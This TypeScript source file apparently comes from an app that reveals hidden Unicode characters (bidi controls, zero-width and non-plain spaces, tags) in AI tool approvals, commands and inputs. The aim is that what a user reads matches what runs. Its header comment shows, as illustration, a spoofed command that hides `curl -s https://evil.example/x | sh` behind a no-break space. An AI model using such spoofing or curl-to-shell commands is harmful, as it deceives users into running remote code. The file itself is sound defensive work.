/**
 * Which characters Pelican writes out, as ⟨U+202E⟩, with a warning, where what you read decides
 * what runs or is sent: an approval, what a folder brings before you trust it, a file Claude sends
 * you and the name you save it under. Claude Code and Claude Desktop show such text as it is; this
 * is Pelican's own addition, and it means to warn of the characters that can make what you read
 * differ from what runs or is sent, within the limits below, and of nothing else: a warning that
 * comes with ordinary text teaches you to pass it by.
 *
 * Written out, wherever they are:
 * - what turns text around, the bidi controls (U+202A to U+202E, U+2066 to U+2069, U+200E, U+200F,
 *   U+061C): a command reads as an echo while the shell runs something else;
 * - what shows as nothing or as a blank, and so can make two names look alike, carry text no one
 *   sees, or pass for the space before a `#` that a shell does not take for one: tags (but in a
 *   flag, below), zero-width spaces, the word joiner, U+FEFF, soft hyphens, the combining grapheme
 *   joiner, Hangul fillers, U+180E, U+2800, U+FFFC, U+1D159, U+FFF9 to U+FFFB, every other
 *   default-ignorable or format character but the signs drawn before Arabic numbers (U+0600 to
 *   U+0605 and the like, which show), a code point no character is assigned to yet (Chrome on a Mac
 *   draws some, such as U+181A and U+A48D, as a blank), and the two private-use characters Apple's
 *   fonts draw as nothing (U+F860 and U+F861);
 * - controls but tab and newline, a carriage return too (a browser draws it as nothing; a shell
 *   takes it as part of a word, so a `cd` whose folder ends in one fails, and the next line runs
 *   where it started), and the line and paragraph separators (drawn as nothing or as a space, and a
 *   line break to JavaScript);
 * - a variation selector after nothing that takes it: after ASCII, a space, or another selector.
 *
 * A space other than a plain one (no-break U+00A0, narrow U+202F, full width U+3000, thin and the
 * rest of Unicode's spaces) shows as a space (the Ogham space mark, U+1680, as a dash), in a
 * command's monospace as wide as a plain one or wider. A shell splits words only at a plain space,
 * a tab or a newline, so it takes one of these as part of a word: `echo done⟨U+00A0⟩# ; curl -s
 * https://evil.example/x | sh` reads as a comment but runs curl (a `#` starts a comment only at the
 * start of a word), and `LC_ALL=C⟨U+00A0⟩cat ./setup.sh` runs ./setup.sh (cat becomes part of the
 * variable). So in a shell command (`runs: 'shell'`) every one is written out but where
 * src/shared/shell-words.ts finds it, for sure, quoted, in a heredoc's body or in a comment, as
 * bash, zsh, dash and macOS's bash 3.2 read the command and the scripts it hands to a shell in the
 * ways that file lists; where it cannot tell, every one is. A quoted screenshot's name, or a commit
 * message with a full-width space in Claude Code's `"$(cat <<'EOF' … EOF)"`, shows as it is. What
 * that file does not follow shows as it is too: a quoted string that a program other than those
 * runs in a shell of its own (python's os.system, make), a script in a file the command does not
 * write itself, and the output of a `$( )` that the shell splits into words (there such a space
 * can only join two arguments).
 *
 * Shown joined by spaces, a program's arguments (`runs: 'argv'`) write out every one, as nothing
 * tells it from the space between two arguments. A PowerShell command (`runs: 'powershell'`) keeps
 * them: PowerShell takes every Unicode space for a space, as it reads. But one that names a POSIX
 * shell (sh, bash, zsh, wsl, ssh and the like), whose script PowerShell hands on and which reads it
 * otherwise, has every one written out. Elsewhere such a space is left as it is: in a path, a name
 * or words it is the space it shows, and written out it would warn of every macOS screenshot (U+202F
 * before AM), French quotation and CJK sentence that holds one.
 *
 * Written out in a command, a path, a name, a rule or a tool's input, which show in monospace:
 * U+FA2E and U+FA2F, compatibility ideographs that the monospace font draws as a blank in Chrome
 * on a Mac (in words they show).
 *
 * Left as they are, wherever they are:
 * - an emoji, whole, with the invisible characters it is made of (EMOJI): its style (VS15 or VS16),
 *   a keycap, a skin tone, the joiners between its pictures, the tags of the flags of England,
 *   Scotland and Wales;
 * - a private-use character, such as Apple's logo (U+F8FF), but the two above: it shows as a glyph
 *   or a box.
 *
 * A command, a path, a name, a rule or a tool's input (the default) writes out every other joiner
 * and variation selector: there one makes two names look alike, and a run of them carries what no
 * one sees. Words (`prose`), such as what Claude says a command does, a web search or the caption
 * of a file it sends, keep those their scripts are written with: a joiner or non-joiner after a
 * letter or mark beyond ASCII (Persian, Arabic, the Indic scripts), and one variation selector after
 * a character that takes it (VS1 to VS14 after a math symbol, an ideograph or a Myanmar, Phags-pa,
 * Manichaean or Egyptian letter, VS17 to VS256 after an ideograph, Mongolian's own after a
 * Mongolian letter). A tool's input shows each of its strings by what its key names (revealInput).
 *
 * The repository's check of its own files (test/hidden-characters.test.ts) is a separate list, for
 * code hygiene: there spaces and private-use characters are escapes too.
 */
import { inWords } from './shell-words';

/**
 * An emoji as the conversation shows it, with the invisible characters that are part of it: a
 * keycap, a flag of two letters, a black flag with the tags of England, Scotland or Wales (the
 * only flags of tags Unicode recommends; other tags show as nothing, or as letters, and may spell
 * anything), or a picture with its text or emoji style, its skin tone, and the joiners that make
 * several pictures one.
 */
export const EMOJI = /[#*0-9]\ufe0f?\u20e3|\p{RI}\p{RI}|\u{1f3f4}\u{e0067}\u{e0062}(?:\u{e0065}\u{e006e}\u{e0067}|\u{e0073}\u{e0063}\u{e0074}|\u{e0077}\u{e006c}\u{e0073})\u{e007f}|\p{ExtPict}(?:\p{EMod}|[\ufe0e\ufe0f])?(?:\u200d\p{ExtPict}(?:\p{EMod}|\ufe0f)?)*/u;

/**
 * A character that may not show as what it is: a control but tab and newline, a line or paragraph
 * separator, one drawn blank, a default-ignorable one (Unicode's list of what to draw as nothing,
 * joiners, selectors, tags and bidi controls among them), another format character but the signs
 * drawn before numbers, a code point not assigned yet, or a private-use one Apple's fonts draw as
 * nothing. Whether it is written out depends on where it is (revealHidden).
 */
const UNSEEN = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u2028\u2029\u2800\uf860\uf861\ufffc\u{1d159}\p{Default_Ignorable_Code_Point}\p{Cn}]|(?![\u0600-\u0605\u06dd\u070f\u0890\u0891\u08e2\u{110bd}\u{110cd}])\p{Cf}/u;

/** A space other than a plain one: one of Unicode's spaces (Zs). */
const SPACE = /(?! )\p{Zs}/u;

/** What the card's monospace font draws as a blank (Chrome on a Mac): two compatibility ideographs. */
const BLANK_IN_MONOSPACE = /[\ufa2e\ufa2f]/u;

/** An emoji, kept whole (the group), a character that may not show as what it is, a space, or a blank in monospace. */
const PARTS = new RegExp(`(${EMOJI.source})|${UNSEEN.source}|${SPACE.source}|${BLANK_IN_MONOSPACE.source}`, 'gu');

/** The joiner and the non-joiner, which Persian, Arabic and the Indic scripts write with. */
const JOINER = /^[\u200c\u200d]$/u;

/** Each kind of variation selector a script writes with, and what it follows in words. */
const VARIANTS: ReadonlyArray<readonly [selector: RegExp, base: RegExp]> = [
  // The variants Unicode lists (VS1 to VS14): of a math symbol, an ideograph, or a Myanmar,
  // Phags-pa, Manichaean or Egyptian letter.
  [/^[\ufe00-\ufe0d]$/u, /^(?:[\p{Sm}\p{Ideographic}]|(?=[\p{scx=Mymr}\p{scx=Phag}\p{scx=Mani}\p{scx=Egyp}])[\p{L}\p{M}])$/u],
  // An ideograph's variant (VS17 to VS256).
  [/^[\u{e0100}-\u{e01ef}]$/u, /^\p{Ideographic}$/u],
  // Mongolian's free variation selectors.
  [/^[\u180b-\u180d\u180f]$/u, /^(?=\p{scx=Mong})\p{L}$/u],
];

/**
 * Whether, in words, `char` is how a script writes after `before`: a joiner after a letter or a
 * mark, a variation selector after what takes it; never after ASCII, nor after a character that
 * may not show itself (so one selector, never a run of them).
 */
function written(char: string, before: string | undefined): boolean {
  if (before === undefined || before <= '\u007f' || UNSEEN.test(before)) return false;
  if (JOINER.test(char)) return /^[\p{L}\p{M}]$/u.test(before);
  return VARIANTS.some(([selector, base]) => selector.test(char) && base.test(before));
}

/** How a text is read, which decides what of it is written out (above). */
export type Reading = {
  /** Words: what Claude says a command does, a search, a caption. */
  prose?: boolean;
  /** What runs: a shell command, a program and its arguments shown joined by spaces, or a PowerShell command. */
  runs?: 'shell' | 'argv' | 'powershell';
};

/** A PowerShell command that names a POSIX shell, or ssh: it hands that a script, which reads a space otherwise. */
const POSIX_SHELL = /(?:^|[\s'"`&|;(){},=\\/])(?:sh|bash|zsh|dash|ksh|mksh|ash|yash|fish|csh|tcsh|busybox|wsl|ssh)(?:\.exe)?(?=$|[\s'"`;|&(){},])/i;

const isSpace = (char: string) => SPACE.test(char);

/**
 * The text with each character that can make it read otherwise than it runs written out as a token
 * (⟨U+202E⟩), and whether there were any, as above: a command, a path, a name, a rule or a tool's
 * input by default, words with `prose`, a shell command, a program's arguments or a PowerShell
 * command with `runs`.
 */
export function revealHidden(text: string, { prose = false, runs }: Reading = {}): { text: string; hidden: boolean } {
  let hidden = false;
  // Where a shell reads a space as part of a word; undefined: everywhere, as when it cannot tell.
  const inWord = runs === 'shell' && SPACE.test(text) ? inWords(text, isSpace) : undefined;
  const keepsSpaces = runs === undefined || (runs === 'powershell' && !POSIX_SHELL.test(text));
  const shown = text.replace(PARTS, (char: string, emoji: string | undefined, at: number) => {
    if (emoji !== undefined) return emoji;
    if (SPACE.test(char)) {
      if (keepsSpaces || (runs === 'shell' && inWord !== undefined && !inWord.has(at))) return char;
    } else if (BLANK_IN_MONOSPACE.test(char)) {
      if (prose) return char;
    } else if (prose && written(char, [...text.slice(Math.max(0, at - 2), at)].at(-1))) {
      return char;
    }
    hidden = true;
    return `⟨U+${char.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}⟩`;
  });
  return { text: shown, hidden };
}

/** Keys of a tool's input whose strings are words: a search, a message, what a task or an agent is to do. */
const WORDS = /^(?:texts?|messages?|body|content|query|prompt|title|subject|description|summary|comments?|notes?|caption|questions?|reason|plan|activeForm)$/i;

/** Whether a tool's input holds words under `key` (WORDS). */
export const holdsWords = (key: string) => WORDS.test(key);

/** How deep a tool's input is shown key by key; deeper, on a line, every space but a plain one written out. */
const DEEPEST_INPUT = 32;

/**
 * A tool's input as JSON, as `JSON.stringify(input, null, 2)` writes it, each string shown as what
 * its key names: words (WORDS), a shell command (`command`), or else a name. Keys are names. Past
 * DEEPEST_INPUT levels (an input can be thousands deep, which a level at a time would take the
 * page's stack for), what is left shows as JSON on one line, as a program's arguments show.
 */
export function revealInput(input: unknown): { text: string; hidden: boolean } {
  let hidden = false;
  const reveal = (text: string, reading: Reading) => {
    const shown = revealHidden(text, reading);
    hidden ||= shown.hidden;
    return JSON.stringify(shown.text);
  };
  const write = (value: unknown, reading: Reading, indent: string, depth: number): string | undefined => {
    if (typeof value === 'string') return reveal(value, reading);
    if (depth >= DEEPEST_INPUT && value !== null && typeof value === 'object') {
      let json: string | undefined;
      try {
        json = JSON.stringify(value);
      } catch {
        // Deeper than this browser writes JSON: said so, and warned of, as nothing of it can be read.
        hidden = true;
        return '"(nested too deeply to show)"';
      }
      const shown = revealHidden(json ?? 'null', { runs: 'argv' });
      hidden ||= shown.hidden;
      return shown.text;
    }
    const inner = `${indent}  `;
    if (Array.isArray(value)) {
      if (value.length === 0) return '[]';
      return `[\n${value.map((item) => `${inner}${write(item, reading, inner, depth + 1) ?? 'null'}`).join(',\n')}\n${indent}]`;
    }
    if (value !== null && typeof value === 'object') {
      const fields = Object.entries(value).flatMap(([key, item]) => {
        const shown = write(item, WORDS.test(key) ? { prose: true } : key === 'command' ? { runs: 'shell' } : {}, inner, depth + 1);
        return shown === undefined ? [] : [`${inner}${reveal(key, {})}: ${shown}`];
      });
      return fields.length === 0 ? '{}' : `{\n${fields.join(',\n')}\n${indent}}`;
    }
    return JSON.stringify(value);
  };
  return { text: write(input, {}, '', 0) ?? '', hidden };
}
